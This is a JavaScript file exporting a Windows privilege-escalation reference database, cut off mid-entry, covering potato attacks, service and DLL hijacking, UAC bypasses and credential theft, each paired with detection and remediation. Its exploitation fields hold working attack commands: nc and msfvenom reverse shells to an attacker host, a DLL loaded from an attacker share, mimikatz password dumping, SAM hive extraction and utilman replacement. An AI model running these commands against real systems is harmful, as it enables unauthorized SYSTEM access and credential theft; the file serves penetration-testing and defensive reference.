// Privilege Escalation Techniques Database
// Comprehensive reference for Windows and Linux privilege escalation

export const PRIVESC_DB = {
  windows: [
    // ═══════════════════════════════════════════════════════════════
    // TOKEN IMPERSONATION / POTATO ATTACKS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "JuicyPotato",
      os: "Windows",
      category: "Token Impersonation",
      description: "Exploits DCOM/BITS to trigger NTLM authentication and impersonate SYSTEM via SeImpersonatePrivilege. Works on Windows 7/Server 2008 through Windows 10 1809/Server 2019. Requires a service account with SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.",
      detection: "Monitor for unusual child processes from service accounts. Look for Security Event 4688 with Token_Elevation_Type=1. Check for processes spawned by IIS worker (w3wp.exe), SQL Server (sqlservr.exe), or other service processes with unexpected command lines.",
      exploitation: "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a '/c whoami > c:\\test.txt' -t * -c {CLSID}",
      command: "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}",
      mitre: "T1134.001 - Token Impersonation/Theft",
      tools: ["JuicyPotato", "RottenPotatoNG"],
      remediation: "Remove SeImpersonatePrivilege from service accounts where not needed. Use Group Managed Service Accounts (gMSA). Upgrade to Windows Server 2019+ where many CLSIDs are blocked."
    },
    {
      name: "PrintSpoofer",
      os: "Windows",
      category: "Token Impersonation",
      description: "Abuses the print spooler service to capture a SYSTEM token via named pipe impersonation. Works on Windows 10 and Server 2019 where JuicyPotato CLSIDs are blocked. Requires SeImpersonatePrivilege.",
      detection: "Monitor for named pipe creation with names like \\\\\\\\pipe\\\\test\\\\pipe\\\\spoolss. Watch for cmd.exe or powershell.exe spawned as SYSTEM from service account context. Sysmon Event 17/18 for pipe creation/connection.",
      exploitation: "PrintSpoofer.exe -i -c cmd.exe — spawns an interactive SYSTEM shell. PrintSpoofer.exe -c 'c:\\temp\\nc.exe attacker_ip 4444 -e cmd.exe' for reverse shell.",
      command: "PrintSpoofer.exe -i -c cmd.exe",
      mitre: "T1134.001 - Token Impersonation/Theft",
      tools: ["PrintSpoofer", "SpoolFool"],
      remediation: "Disable the Print Spooler service on servers that don't need printing (especially DCs). Remove SeImpersonatePrivilege where not needed."
    },
    {
      name: "SweetPotato",
      os: "Windows",
      category: "Token Impersonation",
      description: "Combines multiple potato techniques (RottenPotato, JuicyPotato, PrintSpoofer, EfsPotato) in a single tool. Automatically selects the best technique based on the Windows version. Works on Windows 7 through Windows 11.",
      detection: "Same detection as individual potato variants. Monitor for unusual SYSTEM token creation from service accounts. EDR/AV signatures for SweetPotato binary.",
      exploitation: "SweetPotato.exe -a 'cmd.exe /c whoami > c:\\test.txt'. Can use -e flag to specify technique: clsid, printspoofer, or efspotato.",
      command: "SweetPotato.exe -a 'whoami'",
      mitre: "T1134.001 - Token Impersonation/Theft",
      tools: ["SweetPotato"],
      remediation: "Remove SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege from service accounts. Disable unnecessary services (Print Spooler, BITS)."
    },
    {
      name: "GodPotato",
      os: "Windows",
      category: "Token Impersonation",
      description: "Works on all Windows versions from Windows 8 to Windows 11 and Server 2012 to Server 2022. Uses DCOM OXID resolver manipulation to achieve SYSTEM. Only requires SeImpersonatePrivilege.",
      detection: "Monitor for DCOM OXID resolver anomalies. Watch for unusual named pipe operations. Check for processes running as SYSTEM spawned from service contexts.",
      exploitation: "GodPotato -cmd 'cmd /c whoami'. Works without needing a specific CLSID unlike JuicyPotato.",
      command: "GodPotato.exe -cmd 'cmd /c whoami'",
      mitre: "T1134.001 - Token Impersonation/Theft",
      tools: ["GodPotato"],
      remediation: "Remove SeImpersonatePrivilege from service accounts. Apply principle of least privilege to service accounts."
    },
    {
      name: "EfsPotato",
      os: "Windows",
      category: "Token Impersonation",
      description: "Exploits the Encrypting File System (EFS) service to coerce SYSTEM authentication via the EfsRpcOpenFileRaw function. Similar to PetitPotam but for local privilege escalation.",
      detection: "Monitor for EFS-related API calls from unusual processes. Watch for lsass.exe connections to unexpected named pipes.",
      exploitation: "EfsPotato.exe 'whoami'. Triggers EFS authentication to a controlled named pipe and impersonates the SYSTEM token.",
      command: "EfsPotato.exe 'cmd.exe'",
      mitre: "T1134.001 - Token Impersonation/Theft",
      tools: ["EfsPotato"],
      remediation: "Disable EFS if not needed. Remove SeImpersonatePrivilege from service accounts. Apply KB5005413 patch."
    },
    // ═══════════════════════════════════════════════════════════════
    // SERVICE MISCONFIGURATIONS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Unquoted Service Path",
      os: "Windows",
      category: "Service Misconfiguration",
      description: "When a service binary path contains spaces and is not enclosed in quotes, Windows tries each space-delimited substring as a path. An attacker who can write to an earlier-resolved path can hijack the service. Example: C:\\Program Files\\My App\\service.exe tries C:\\Program.exe, then C:\\Program Files\\My.exe, then the full path.",
      detection: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\"'. PowerShell: Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -match ' '} | Select-Object Name, PathName, StartMode",
      exploitation: "1. Find unquoted service path with spaces. 2. Check write permissions on parent directories with icacls. 3. Place malicious binary at the earlier-resolved path. 4. Restart the service or wait for system reboot.",
      command: "wmic service get name,pathname,startmode | findstr /i /v \"C:\\\\Windows\" | findstr /i /v '\"'",
      mitre: "T1574.009 - Path Interception by Unquoted Path",
      tools: ["PowerUp", "WinPEAS", "SharpUp", "BeRoot"],
      remediation: "Enclose all service binary paths in quotes. Audit service configurations regularly. Remove write permissions on service directories for non-admin users."
    },
    {
      name: "Weak Service Permissions",
      os: "Windows",
      category: "Service Misconfiguration",
      description: "When a low-privileged user has permissions to modify a service's configuration (ChangeConfig), binary path, or start/stop the service, they can change the binary path to a malicious executable and restart the service to execute as SYSTEM.",
      detection: "accesschk.exe -uwcqv 'Authenticated Users' * /accepteula. accesschk.exe -uwcqv 'Everyone' * /accepteula. PowerShell: Get-ServiceAcl to check service DACLs.",
      exploitation: "sc qc <service_name> — check current config. sc config <service_name> binpath='cmd.exe /c net localgroup administrators attacker /add' — change binary path. sc stop <service_name> && sc start <service_name> — restart to trigger.",
      command: "accesschk.exe /accepteula -uwcqv \"Everyone\" * | findstr SERVICE_CHANGE_CONFIG",
      mitre: "T1574.011 - Services Registry Permissions Weakness",
      tools: ["accesschk", "PowerUp", "WinPEAS", "SharpUp"],
      remediation: "Review and restrict service DACLs. Only SYSTEM and Administrators should have SERVICE_CHANGE_CONFIG. Use sc sdshow <service> to review security descriptors."
    },
    {
      name: "Weak Service Binary Permissions",
      os: "Windows",
      category: "Service Misconfiguration",
      description: "When the service binary itself or its directory is writable by a low-privileged user, the binary can be replaced with a malicious one. When the service restarts, the malicious binary runs as the service account (often SYSTEM).",
      detection: "icacls 'C:\\path\\to\\service.exe' — check for (M)odify, (W)rite, or (F)ull Control for non-admin groups. accesschk.exe -wvu 'C:\\path\\to\\service.exe'. WinPEAS automatically checks all service binary permissions.",
      exploitation: "1. Find writable service binary: icacls shows write access for current user. 2. Backup original: copy service.exe service.exe.bak. 3. Replace with payload: copy /y payload.exe service.exe. 4. Restart service: sc stop/start or wait for reboot.",
      command: "icacls \"C:\\Program Files\\VulnApp\\service.exe\"",
      mitre: "T1574.010 - Services File Permissions Weakness",
      tools: ["icacls", "accesschk", "PowerUp", "WinPEAS"],
      remediation: "Ensure service binaries and their directories are only writable by Administrators and SYSTEM. Set proper ACLs during installation."
    },
    {
      name: "Service Registry Key Permissions",
      os: "Windows",
      category: "Service Misconfiguration",
      description: "Each service has a registry key under HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>. If a low-privileged user can modify this key, they can change the ImagePath value to point to a malicious binary.",
      detection: "Get-Acl HKLM:\\SYSTEM\\CurrentControlSet\\Services\\* | ForEach-Object { $acl = $_; $_.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone|Authenticated' -and $_.RegistryRights -match 'SetValue|FullControl' } | ForEach-Object { [PSCustomObject]@{Key=$acl.Path; Identity=$_.IdentityReference; Rights=$_.RegistryRights} } }",
      exploitation: "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnService /v ImagePath /t REG_EXPAND_SZ /d 'cmd.exe /c net localgroup administrators attacker /add' /f. Then restart the service.",
      command: "accesschk.exe /accepteula -kvusw hklm\\System\\CurrentControlSet\\services",
      mitre: "T1574.011 - Services Registry Permissions Weakness",
      tools: ["accesschk", "PowerUp", "WinPEAS", "reg.exe"],
      remediation: "Restrict registry key permissions for service entries. Only SYSTEM and Administrators should have write access."
    },
    // ═══════════════════════════════════════════════════════════════
    // DLL HIJACKING
    // ═══════════════════════════════════════════════════════════════
    {
      name: "DLL Search Order Hijacking",
      os: "Windows",
      category: "DLL Hijacking",
      description: "Windows searches for DLLs in a specific order: application directory, system directories (System32, SysWOW64), Windows directory, current directory, PATH directories. If an application loads a DLL without specifying the full path and the application directory is writable, a malicious DLL can be placed there.",
      detection: "Use Process Monitor (procmon) to find DLL load failures (result: NAME NOT FOUND) for privileged processes. Sysmon Event 7 (Image Loaded) with Signed=false. Look for DLLs loaded from unexpected directories.",
      exploitation: "1. Run procmon, filter for 'NAME NOT FOUND' results on DLL loads from privileged processes. 2. Create a malicious DLL with the missing name. 3. Place it in the application directory or a writable PATH directory. 4. Trigger the application to load the DLL.",
      command: "procmon.exe /backingfile c:\\temp\\procmon.pml /quiet",
      mitre: "T1574.001 - DLL Search Order Hijacking",
      tools: ["Process Monitor", "DLLSpy", "Robber", "PowerUp"],
      remediation: "Use absolute paths for DLL loading. Implement DLL Safe Search Mode (SetDllDirectory). Use DLL manifest to specify exact DLL locations. Remove writable directories from PATH."
    },
    {
      name: "DLL Side-Loading",
      os: "Windows",
      category: "DLL Hijacking",
      description: "Legitimate signed applications that load specific DLLs can be abused by placing a malicious DLL with the expected name alongside the application. The signed application loads the malicious DLL, effectively running malicious code with the reputation of the signed binary.",
      detection: "Sysmon Event 7 for unsigned DLLs loaded by signed applications. Check for known side-loadable pairs: legitimate_app.exe + malicious.dll. EDR correlation of DLL loads with file creation events.",
      exploitation: "1. Identify a signed application that side-loads a DLL (many AV/utility vendors are vulnerable). 2. Create a malicious DLL with the expected export functions. 3. Copy the signed EXE and malicious DLL to a writable location. 4. Execute the signed EXE.",
      command: "copy legitimate_signed.exe c:\\temp\\ && copy malicious.dll c:\\temp\\expected_name.dll && c:\\temp\\legitimate_signed.exe",
      mitre: "T1574.002 - DLL Side-Loading",
      tools: ["SideLoader", "DLLSpy", "SharpDllProxy"],
      remediation: "Application developers should use absolute DLL paths, implement DLL integrity checks, and use manifest-based loading."
    },
    {
      name: "Phantom DLL Hijacking",
      os: "Windows",
      category: "DLL Hijacking",
      description: "Some Windows services and applications try to load DLLs that don't exist on disk (phantom DLLs). If the directory where they search is writable, placing a DLL with the expected name achieves code execution. Common targets: wlbsctrl.dll (loaded by IKEEXT service), wbemcomn.dll, fveapi.dll.",
      detection: "Process Monitor filtering for NAME NOT FOUND on DLL loads by SYSTEM processes. Monitor for new DLL files appearing in service directories.",
      exploitation: "sc query IKEEXT — check if IKEEXT service is running. If stopped but set to Manual/Auto and wlbsctrl.dll doesn't exist in System32, place malicious wlbsctrl.dll in System32 (requires write access) and start the service.",
      command: "sc query IKEEXT && dir C:\\Windows\\System32\\wlbsctrl.dll",
      mitre: "T1574.001 - DLL Search Order Hijacking",
      tools: ["Process Monitor", "WinPEAS"],
      remediation: "Audit for phantom DLL load attempts. Ensure System32 and service directories are not writable by non-admin users."
    },
    // ═══════════════════════════════════════════════════════════════
    // ALWAYSINSTALLELEVATED
    // ═══════════════════════════════════════════════════════════════
    {
      name: "AlwaysInstallElevated",
      os: "Windows",
      category: "Policy Misconfiguration",
      description: "When the AlwaysInstallElevated policy is enabled in both HKLM and HKCU, any user can install MSI packages with SYSTEM privileges. This is a common misconfiguration that provides a trivial path to SYSTEM.",
      detection: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated. reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated. Both must be set to 0x1 for the vulnerability to exist.",
      exploitation: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o evil.msi. Then: msiexec /quiet /qn /i evil.msi — installs silently with SYSTEM privileges.",
      command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
      mitre: "T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control",
      tools: ["msfvenom", "PowerUp", "WinPEAS", "msiexec"],
      remediation: "Disable AlwaysInstallElevated in Group Policy. Set both registry values to 0. Computer Configuration > Administrative Templates > Windows Components > Windows Installer > Always install with elevated privileges = Disabled."
    },
    // ═══════════════════════════════════════════════════════════════
    // STORED CREDENTIALS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Stored Credentials (cmdkey)",
      os: "Windows",
      category: "Credential Access",
      description: "Windows Credential Manager stores credentials for RDP, SMB, and other services. If an admin has saved credentials using cmdkey or through the Windows GUI, a low-privileged user on the same system can use runas /savecred to execute commands with the stored credentials.",
      detection: "cmdkey /list — shows stored credentials. Vault::list in mimikatz. Monitor for runas.exe usage with /savecred flag (Security Event 4648). Check Windows Credential Manager via Control Panel.",
      exploitation: "cmdkey /list — check for stored admin credentials. runas /savecred /user:DOMAIN\\admin 'cmd.exe /c whoami > c:\\test.txt'. Works because /savecred uses the stored password without prompting.",
      command: "cmdkey /list && runas /savecred /user:admin cmd.exe",
      mitre: "T1555.004 - Windows Credential Manager",
      tools: ["cmdkey", "runas", "mimikatz", "LaZagne"],
      remediation: "Remove stored credentials: cmdkey /delete:target. Disable credential caching via GPO. Use privileged access workstations (PAWs) instead of saving credentials."
    },
    {
      name: "DPAPI Credential Extraction",
      os: "Windows",
      category: "Credential Access",
      description: "Data Protection API (DPAPI) protects browser passwords, WiFi keys, VPN credentials, and more. With user context or the DPAPI backup key (domain admin), all protected secrets can be decrypted. User master keys are in %APPDATA%\\Microsoft\\Protect\\{SID}.",
      detection: "Monitor access to %APPDATA%\\Microsoft\\Protect directories (Sysmon Event 11/4663). Watch for mimikatz dpapi module usage. Security Event 4693 (master key recovery). Monitor lsass.exe memory access.",
      exploitation: "mimikatz # sekurlsa::dpapi — dump DPAPI master keys from LSASS. mimikatz # dpapi::masterkey /in:<key_file> /rpc — decrypt master key using DC. mimikatz # dpapi::chrome /in:'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data' — decrypt Chrome passwords.",
      command: "mimikatz.exe \"sekurlsa::dpapi\" \"exit\"",
      mitre: "T1555.004 - Windows Credential Manager",
      tools: ["mimikatz", "SharpDPAPI", "DonPAPI", "LaZagne"],
      remediation: "Implement Credential Guard. Use gMSA for service accounts. Rotate the DPAPI backup key periodically. Monitor DPAPI-related events."
    },
    {
      name: "Unattended Installation Files",
      os: "Windows",
      category: "Credential Access",
      description: "Windows unattended installation files (unattend.xml, sysprep.xml, sysprep.inf) may contain plaintext or base64-encoded administrator passwords left over from automated deployments.",
      detection: "Search for these files: dir /s /b C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Windows\\Panther\\unattend.xml C:\\Windows\\Panther\\Unattend\\unattend.xml C:\\Windows\\system32\\sysprep\\sysprep.xml.",
      exploitation: "type C:\\Windows\\Panther\\unattend.xml | findstr /i password. Look for <AutoLogon>, <AdministratorPassword>, and <Password> elements. Passwords may be base64-encoded — decode with: echo <encoded_password> | base64 -d.",
      command: "dir /s /b C:\\*unattend* C:\\*sysprep* 2>nul",
      mitre: "T1552.001 - Credentials In Files",
      tools: ["WinPEAS", "PowerUp", "metasploit post/windows/gather/enum_unattend"],
      remediation: "Remove unattended installation files after deployment. Use Group Policy Preferences with caution (cpassword vulnerability). Regularly scan for files containing credentials."
    },
    // ═══════════════════════════════════════════════════════════════
    // UAC BYPASS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "UAC Bypass - FodHelper",
      os: "Windows",
      category: "UAC Bypass",
      description: "fodhelper.exe is a Windows binary that auto-elevates without UAC prompt. It reads a registry key (HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command) that can be set by a non-admin user, allowing command execution with elevated privileges.",
      detection: "Monitor registry modifications to HKCU\\Software\\Classes\\ms-settings. Watch for fodhelper.exe spawning unexpected child processes. Sysmon Event 13 for registry value set on ms-settings key.",
      exploitation: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d 'cmd.exe' /f. reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f. fodhelper.exe — spawns elevated cmd.exe.",
      command: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d cmd.exe /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f && fodhelper.exe",
      mitre: "T1548.002 - Bypass User Account Control",
      tools: ["UACME", "SharpBypassUAC", "metasploit bypassuac_fodhelper"],
      remediation: "Set UAC to 'Always Notify' (highest level). Use Local Admin Password Solution (LAPS). Remove users from local Administrators group where possible."
    },
    {
      name: "UAC Bypass - eventvwr.exe",
      os: "Windows",
      category: "UAC Bypass",
      description: "Event Viewer (eventvwr.exe) auto-elevates and reads from HKCU\\Software\\Classes\\mscfile\\shell\\open\\command before falling back to HKCR. By setting a custom command in HKCU, an attacker can hijack the auto-elevation.",
      detection: "Monitor registry modifications to HKCU\\Software\\Classes\\mscfile\\shell\\open\\command. Watch for eventvwr.exe spawning unexpected processes. Sysmon Events 12/13 for the registry modification.",
      exploitation: "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'cmd.exe' /f. reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /v DelegateExecute /t REG_SZ /f. eventvwr.exe — spawns elevated cmd.",
      command: "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d cmd.exe /f && eventvwr.exe",
      mitre: "T1548.002 - Bypass User Account Control",
      tools: ["UACME", "metasploit bypassuac_eventvwr"],
      remediation: "Set UAC to 'Always Notify'. Apply Windows updates (some bypasses are patched). Monitor auto-elevating binaries."
    },
    {
      name: "UAC Bypass - ComputerDefaults",
      os: "Windows",
      category: "UAC Bypass",
      description: "computerdefaults.exe is a Windows auto-elevating binary that checks HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command for a custom handler. Similar to fodhelper but uses a different binary.",
      detection: "Same as fodhelper — monitor HKCU\\Software\\Classes\\ms-settings registry key modifications and unexpected child processes of computerdefaults.exe.",
      exploitation: "Same registry key as fodhelper. reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d 'powershell.exe' /f. computerdefaults.exe — spawns elevated PowerShell.",
      command: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d powershell.exe /f && computerdefaults.exe",
      mitre: "T1548.002 - Bypass User Account Control",
      tools: ["UACME"],
      remediation: "Set UAC to 'Always Notify'. Remove users from local Administrators group."
    },
    // ═══════════════════════════════════════════════════════════════
    // REGISTRY AUTORUNS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Registry Run Key Persistence",
      os: "Windows",
      category: "Registry Autoruns",
      description: "Multiple registry locations cause programs to run at startup or logon. If a user can write to these keys in HKLM, they can achieve persistence as SYSTEM (for machine keys) or as the target user (for HKCU keys). HKLM runs execute before user logon.",
      detection: "Sysmon Event 13 for registry value modifications. Autoruns.exe from Sysinternals to enumerate all autostart locations. reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run. Monitor Security Event 4657.",
      exploitation: "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v Backdoor /t REG_SZ /d 'C:\\temp\\beacon.exe' — runs at every logon. Also check: RunOnce, RunOnceEx, RunServices, Explorer\\Shell Folders, Winlogon\\Shell, Winlogon\\Userinit.",
      command: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      mitre: "T1547.001 - Registry Run Keys / Startup Folder",
      tools: ["Autoruns", "WinPEAS", "PowerUp", "SharpUp"],
      remediation: "Restrict write access to HKLM Run keys to Administrators only. Use AppLocker or WDAC to block unauthorized executables. Regularly audit autorun entries with Autoruns."
    },
    // ═══════════════════════════════════════════════════════════════
    // SCHEDULED TASK ABUSE
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Scheduled Task Binary Replacement",
      os: "Windows",
      category: "Scheduled Task Abuse",
      description: "If a scheduled task runs a binary from a user-writable location, replacing the binary achieves code execution with the task's privileges. Many third-party applications create tasks that run as SYSTEM but reference binaries in writable directories.",
      detection: "schtasks /query /fo CSV /v | findstr /i 'SYSTEM' — find tasks running as SYSTEM. Check the task's binary path permissions with icacls. Monitor for binary replacement via Sysmon Event 11.",
      exploitation: "schtasks /query /fo LIST /v | findstr /i 'SYSTEM\\|Task To Run' — find SYSTEM tasks. icacls 'C:\\path\\to\\task\\binary.exe' — check if writable. Replace binary with payload, wait for task execution.",
      command: "schtasks /query /fo LIST /v | findstr /i \"SYSTEM\" /b",
      mitre: "T1053.005 - Scheduled Task",
      tools: ["schtasks", "WinPEAS", "PowerUp", "accesschk"],
      remediation: "Ensure scheduled task binaries are in protected directories. Run tasks with least privilege. Audit task configurations regularly."
    },
    // ═══════════════════════════════════════════════════════════════
    // NAMED PIPE IMPERSONATION
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Named Pipe Impersonation",
      os: "Windows",
      category: "Named Pipe",
      description: "A process with SeImpersonatePrivilege can create a named pipe and impersonate any client that connects to it. By coercing a SYSTEM process to connect (via Print Spooler, EFS, etc.), the attacker obtains a SYSTEM token.",
      detection: "Sysmon Events 17/18 for pipe creation and connection. Monitor for unusual named pipe names. Watch for processes creating pipes from service account contexts.",
      exploitation: "Create a named pipe server, coerce a SYSTEM service to connect (PetitPotam, PrinterBug, DFSCoerce), impersonate the connecting token. Tools automate this entire chain.",
      command: "pipelist.exe — enumerate named pipes. accesschk.exe -w \\\\pipe\\* — check writable pipes",
      mitre: "T1134.001 - Token Impersonation/Theft",
      tools: ["PrintSpoofer", "PetitPotam", "DFSCoerce", "Coercer"],
      remediation: "Remove SeImpersonatePrivilege from unnecessary accounts. Disable vulnerable coercion services. Apply security patches."
    },
    // ═══════════════════════════════════════════════════════════════
    // DCOM EXPLOITATION
    // ═══════════════════════════════════════════════════════════════
    {
      name: "DCOM Object Abuse",
      os: "Windows",
      category: "DCOM",
      description: "Certain DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow, Excel.Application, Outlook.Application) can be instantiated remotely and used to execute commands. Used for both local privesc and lateral movement.",
      detection: "Monitor for DCOM-related network traffic (TCP 135 + dynamic ports). Watch for dllhost.exe spawning unexpected child processes. Check for unusual COM object instantiation in process creation logs.",
      exploitation: "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','target_ip')).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami','7'). Or use ShellWindows: $com = [activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39','target_ip')); $com.item().Document.Application.ShellExecute('cmd.exe','/c calc.exe','c:\\windows\\system32',$null,0)",
      command: "Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name | Where-Object {$_.Name -match 'Shell|MMC|Excel'}",
      mitre: "T1021.003 - DCOM",
      tools: ["Impacket dcomexec", "CrackMapExec", "PowerShell"],
      remediation: "Restrict DCOM access via DCOMCNFG. Enable Windows Firewall to block RPC. Apply the principle of least privilege for DCOM permissions."
    },
    // ═══════════════════════════════════════════════════════════════
    // PRINT SPOOLER BUGS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "PrintNightmare (CVE-2021-34527)",
      os: "Windows",
      category: "Print Spooler",
      description: "Remote code execution and local privilege escalation via the Windows Print Spooler service. Allows an authenticated user to load a malicious DLL as SYSTEM by adding a printer driver. Affects all Windows versions.",
      detection: "Monitor for new printer driver installations (Event 321 in PrintService/Admin). Watch for spoolsv.exe loading DLLs from unusual paths. Check for Security Event 4688 showing spoolsv.exe spawning child processes.",
      exploitation: "Local: Import-Module .\\CVE-2021-34527.ps1; Invoke-Nightmare -DLL 'C:\\path\\to\\malicious.dll'. Remote: python3 CVE-2021-34527.py domain/user:password@target_ip '\\\\attacker_ip\\share\\evil.dll'",
      command: "Get-Service Spooler | Select-Object Status, StartType",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["Invoke-Nightmare", "SharpPrintNightmare", "Impacket"],
      remediation: "Disable Print Spooler service on servers and DCs that don't need printing. Apply Microsoft patches (KB5004945, KB5004946). Restrict Point and Print via Group Policy."
    },
    {
      name: "SpoolFool (CVE-2022-21999)",
      os: "Windows",
      category: "Print Spooler",
      description: "Local privilege escalation via Print Spooler by abusing the SpoolDirectory setting. Allows writing arbitrary DLLs to System32 by creating a junction point. Escalates from user to SYSTEM.",
      detection: "Monitor for junction point creation targeting System32. Watch for modifications to printer SpoolDirectory settings. Check for unusual DLL files appearing in System32.",
      exploitation: "SpoolFool.exe -dll evil.dll — automatically creates junction, sets SpoolDirectory, triggers DLL load as SYSTEM.",
      command: "SpoolFool.exe -dll payload.dll",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["SpoolFool"],
      remediation: "Apply Microsoft patch. Disable Print Spooler on servers that don't need it."
    },
    // ═══════════════════════════════════════════════════════════════
    // SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
    // ═══════════════════════════════════════════════════════════════
    {
      name: "SeImpersonatePrivilege Abuse",
      os: "Windows",
      category: "Privilege Abuse",
      description: "The SeImpersonatePrivilege allows a process to impersonate a client after authentication. Service accounts (IIS, MSSQL, etc.) commonly have this privilege. All potato attacks rely on this privilege to escalate to SYSTEM.",
      detection: "whoami /priv — check if SeImpersonatePrivilege is enabled. Security Event 4672 logs when this privilege is assigned during logon. Monitor for potato tools via process creation events.",
      exploitation: "If SeImpersonatePrivilege is enabled: use any potato variant (JuicyPotato, PrintSpoofer, GodPotato, SweetPotato, RoguePotato) to escalate to SYSTEM.",
      command: "whoami /priv | findstr SeImpersonate",
      mitre: "T1134.001 - Token Impersonation/Theft",
      tools: ["JuicyPotato", "PrintSpoofer", "GodPotato", "SweetPotato", "RoguePotato"],
      remediation: "Remove SeImpersonatePrivilege from accounts that don't need it. Use Group Managed Service Accounts. Run services as NetworkService instead of LocalSystem where possible."
    },
    {
      name: "SeBackupPrivilege Abuse",
      os: "Windows",
      category: "Privilege Abuse",
      description: "SeBackupPrivilege allows reading any file on the system, bypassing DACLs. An attacker can extract the SAM, SYSTEM, and SECURITY registry hives, or copy NTDS.dit from a domain controller to extract all domain password hashes.",
      detection: "Monitor for reg save commands targeting SAM/SYSTEM/SECURITY. Watch for robocopy or diskshadow usage with backup semantics. Security Event 4672 logs when SeBackupPrivilege is assigned.",
      exploitation: "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive — extract local password hashes. On DC: diskshadow to create volume shadow copy, then robocopy /B to copy NTDS.dit.",
      command: "whoami /priv | findstr SeBackup",
      mitre: "T1003.002 - Security Account Manager",
      tools: ["reg.exe", "robocopy", "diskshadow", "secretsdump.py"],
      remediation: "Only assign SeBackupPrivilege to dedicated backup service accounts. Monitor usage of this privilege. Use PAWs for backup administration."
    },
    {
      name: "SeRestorePrivilege Abuse",
      os: "Windows",
      category: "Privilege Abuse",
      description: "SeRestorePrivilege allows writing any file on the system, bypassing DACLs. An attacker can overwrite system binaries, DLLs, or the utilman.exe/sethc.exe accessibility tools to gain SYSTEM access at the login screen.",
      detection: "Monitor for file replacements in System32. Watch for changes to utilman.exe, sethc.exe, osk.exe, narrator.exe, magnify.exe. Security Event 4672 logs privilege assignment.",
      exploitation: "copy cmd.exe C:\\Windows\\System32\\utilman.exe — replace Utility Manager with cmd.exe. At the Windows login screen, press Win+U to get a SYSTEM command prompt.",
      command: "whoami /priv | findstr SeRestore",
      mitre: "T1546.008 - Accessibility Features",
      tools: ["robocopy", "copy"],
      remediation: "Remove SeRestorePrivilege from unnecessary accounts. Protect accessibility binaries with integrity checks."
    },
    {
      name: "SeTakeOwnershipPrivilege Abuse",
      os: "Windows",
      category: "Privilege Abuse",
      description: "SeTakeOwnershipPrivilege allows taking ownership of any securable object (files, registry keys, AD objects). After taking ownership, the attacker can modify DACLs to grant themselves full access.",
      detection: "Monitor for ownership changes on critical objects (Security Event 4670). Watch for takeown.exe usage followed by icacls modifications.",
      exploitation: "takeown /f C:\\Windows\\System32\\config\\SAM && icacls C:\\Windows\\System32\\config\\SAM /grant user:F — take ownership of SAM file and grant full control. Then extract hashes.",
      command: "whoami /priv | findstr SeTakeOwnership",
      mitre: "T1222.001 - Windows File and Directory Permissions Modification",
      tools: ["takeown", "icacls", "SetACL"],
      remediation: "Remove SeTakeOwnershipPrivilege from non-admin accounts. Monitor ownership changes."
    },
    // ═══════════════════════════════════════════════════════════════
    // MISCELLANEOUS WINDOWS PRIVESC
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Insecure GUI Application",
      os: "Windows",
      category: "Miscellaneous",
      description: "If a GUI application runs as SYSTEM and has a file dialog (Open/Save), the dialog can be used to browse the filesystem and launch cmd.exe. Common in old installers, help desk tools, and misconfigured remote access applications.",
